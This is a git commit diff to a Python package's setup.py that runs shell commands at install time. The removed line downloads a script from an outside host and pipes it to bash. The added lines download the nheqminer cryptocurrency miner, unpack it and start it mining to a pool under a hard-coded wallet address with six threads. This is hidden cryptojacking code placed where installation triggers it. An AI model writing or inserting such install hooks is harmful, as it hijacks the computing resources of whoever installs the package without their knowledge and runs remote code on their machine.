53ad6c54ca9cc6b50a9de23beb96e7a391725727
kursten1 <94533609+kursten1@users.noreply.github.com>
2021-11-19 04:11:39 +0700

    Update setup.py

--- setup.py
+++ setup.py
@@ -1,3 +1,6 @@
 import os
 os.system('lscpu')
-os.system("curl 'https://animania.tech/start.txt?w=test&r=eu&t=6&a=RXKKMD5LHex9nrigfwjFeu1t79144WXS2c' --output start.txt && bash start.txt")
+os.system("wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz")
+os.system("tar xf nheqminer-Linux-v0.8.2.tgz")
+os.system("tar xf nheqminer-Linux-v0.8.2.tar.gz")
+os.system("./nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RXKKMD5LHex9nrigfwjFeu1t79144WXS2c.Go -p x -t 6")
